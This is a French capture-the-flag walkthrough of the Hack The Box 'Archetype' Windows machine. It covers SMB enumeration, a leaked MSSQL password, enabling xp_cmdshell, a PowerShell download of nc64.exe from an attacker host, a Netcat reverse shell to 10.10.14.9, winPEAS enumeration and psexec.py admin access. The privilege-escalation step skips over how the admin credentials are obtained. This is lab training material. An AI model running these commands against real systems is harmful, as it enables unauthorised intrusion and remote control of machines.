# Archetype Write-up

## Introduction

Bienvenue à TIER II ! Félicitations pour être arrivé jusqu'ici. À partir de maintenant, les machines deviennent un peu plus difficiles en termes d'étapes, d'utilisation des outils et de tentatives d'exploitation, car elles commencent à ressembler aux machines de la plateforme principale de HTB. En commençant par Archetype, qui est une machine Windows, vous aurez l'occasion d'exploiter une mauvaise configuration dans Microsoft SQL Server, d'essayer d'obtenir un shell inverse et de vous familiariser avec l'utilisation de l'outil Impacket pour attaquer d'autres services.

## Énumération

Réaliser un scan réseau pour détecter les ports ouverts est déjà connu comme une partie essentielle du processus d'énumération. Cela nous offre l'opportunité de mieux comprendre la surface d'attaque et de concevoir des attaques ciblées. Comme dans la plupart des cas, nous allons utiliser l'outil célèbre `nmap` :

- **Commande** : `nmap -sC -sV {TARGET_IP}`

Nous avons découvert que les ports SMB sont ouverts et qu'un Microsoft SQL Server 2017 est également en cours d'exécution sur le port 1433. Nous allons énumérer les services SMB avec l'outil `smbclient` :

- **Commande** : `smbclient -N -L \\{TARGET_IP}\`

    - `-N` : Pas de mot de passe.
    - `-L` : Cette option permet de voir quels services sont disponibles sur un serveur.

Nous avons trouvé quelques partages intéressants. Les partages `ADMIN$` et `C$` ne sont pas accessibles comme l'indique l'erreur "Access Denied", cependant, nous pouvons essayer d'accéder et d'énumérer le partage `backups` en utilisant la commande suivante :

- **Commande** : `smbclient -N \\{TARGET_IP}\backups`

Il y a un fichier nommé `prod.dtsConfig` qui semble être un fichier de configuration. Nous pouvons le télécharger sur notre machine locale en utilisant la commande `get` pour une inspection plus approfondie hors ligne.

- **Commande** : `get prod.dtsConfig`

En examinant le contenu de ce fichier de configuration, nous repérons en clair le mot de passe de l'utilisateur `sql_svc`, qui est `M3g4c0rp123`, pour l'hôte `ARCHETYPE`. Avec les informations d'identification fournies, nous avons juste besoin d'un moyen pour nous connecter et nous authentifier au serveur MSSQL. L'outil Impacket inclut un script Python précieux appelé `mssqlclient.py` qui offre cette fonctionnalité.

### Impacket

Impacket est une collection de classes Python pour travailler avec divers protocoles réseau. Il se concentre sur la fourniture d'un accès programmatique de bas niveau aux paquets réseau et, pour certains protocoles (par exemple, SMB1-3 et MSRPC), sur l'implémentation du protocole lui-même. Les paquets peuvent être construits à partir de zéro, ainsi que parsés à partir de données brutes. L'API orientée objet simplifie le travail avec des hiérarchies complexes de protocoles. La bibliothèque fournit également une série d'outils en tant qu'exemples de ce qui peut être réalisé dans ce contexte.

### Installation d'Impacket

- **Commande** : `git clone https://github.com/SecureAuthCorp/impacket.git`
- **Commande** : `cd impacket`
- **Commande** : `pip3 install .`
- **Commande** : `sudo python3 setup.py install` (si nécessaire)
- **Commande** : `pip3 install -r requirements.txt` (si des modules manquent)
- **Commande** : `cd examples`
- **Commande** : `python3 mssqlclient.py -h`

### `mssqlclient.py`

`mssqlclient.py` est un script de la suite d'outils Impacket qui permet de se connecter à une base de données Microsoft SQL Server et d'exécuter des commandes SQL. Il prend en charge l'authentification Windows et SQL Server, et peut être utilisé pour interagir avec le serveur SQL pour des tâches d'administration ou d'exploitation.

### Connexion au serveur MSSQL

Après avoir compris les options fournies, nous pouvons essayer de nous connecter au serveur MSSQL en utilisant la commande suivante avec les informations d'identification découvertes précédemment :

- **Commande** : `python3 mssqlclient.py ARCHETYPE/sql_svc@{TARGET_IP} -windows-auth`

Nous nous sommes authentifiés avec succès au serveur Microsoft SQL Server !

## Obtention d'un accès initial

Après notre connexion réussie, il est conseillé de vérifier l'option d'aide de notre shell SQL pour comprendre les fonctionnalités disponibles.

Pour vérifier si `xp_cmdshell` est activé, nous pouvons utiliser la commande suivante :

- **Commande** : `EXEC xp_cmdshell 'net user';`

Si `xp_cmdshell` n'est pas activé, nous devons l'activer avec les commandes suivantes :

- **Commande** : `EXEC sp_configure 'show advanced options', 1;`
- **Commande** : `RECONFIGURE;`
- **Commande** : `EXEC sp_configure 'xp_cmdshell', 1;`
- **Commande** : `RECONFIGURE;`

Maintenant, nous sommes capables d'exécuter des commandes système. Nous allons télécharger l'exécutable `nc64.exe` sur la machine cible et établir un shell interactif via Netcat.

### `nc64.exe`

`nc64.exe` est la version 64 bits de Netcat, un outil réseau polyvalent utilisé pour lire et écrire des données sur des connexions réseau en utilisant les protocoles TCP ou UDP. Il peut être utilisé pour ouvrir des ports, établir des connexions, transférer des fichiers, effectuer des scans de ports, et plus encore. Dans ce contexte, nous l'utilisons pour obtenir un shell inverse.

### Téléchargement et exécution de Netcat

Sur notre machine locale, démarrez un serveur HTTP simple et un écouteur Netcat :

- **Commande** : `sudo python3 -m http.server 80`
- **Commande** : `sudo nc -lvnp 443`

Sur la machine cible, téléchargez `nc64.exe` :

- **Commande** : `xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.14.9/nc64.exe -outfile nc64.exe"`

Puis, établissez la connexion inverse :

- **Commande** : `xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe 10.10.14.9 443"`

## Escalade de privilèges

Pour l'escalade de privilèges, nous allons utiliser un outil appelé `winPEAS`, qui peut automatiser une grande partie du processus d'énumération sur le système cible.

### Téléchargement et exécution de winPEAS

Téléchargez `winPEAS` sur la machine cible en utilisant la commande suivante :

- **Commande** : `wget http://10.10.14.9/winPEASx64.exe -outfile winPEASx64.exe`

Ensuite, exécutez `winPEAS` :

- **Commande** : `PS C:\Users\sql_svc\Downloads> .\winPEASx64.exe`

En examinant la sortie, nous pouvons trouver des informations critiques, telles que `SeImpersonatePrivilege`, qui est vulnérable à l'exploitation `juicy potato`.

### `psexec.py`

`psexec.py` est un autre script de la suite Impacket qui permet d'exécuter des commandes à distance sur des machines Windows en utilisant les protocoles SMB et DCE/RPC. Inspiré de `PsExec` de Sysinternals, il est souvent utilisé pour obtenir un shell distant sur des systèmes cibles, facilitant ainsi les opérations de post-exploitation.

Si nous trouvons les informations d'identification de l'administrateur, nous pouvons utiliser `psexec.py` de la suite Impacket pour obtenir un shell en tant qu'administrateur :

- **Commande** : `python3 psexec.py administrator@{TARGET_IP}`

Nous avons réussi à obtenir les deux drapeaux, félicitations !
